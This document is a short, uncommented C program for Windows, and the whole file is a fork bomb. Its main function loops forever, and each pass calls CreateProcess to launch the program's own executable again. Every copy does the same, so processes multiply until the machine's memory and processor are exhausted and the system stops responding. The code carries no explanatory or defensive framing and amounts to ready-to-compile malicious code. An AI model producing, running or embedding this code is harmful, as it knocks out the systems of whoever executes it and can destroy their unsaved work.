#include <windows.h>
#include <stdio.h>
int main(int argc, char** argv)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    while (1)
    {
        CreateProcess(*argv ,NULL, NULL , NULL , FALSE, 0, NULL , NULL , &si, &pi);
    }
    return 0;
}
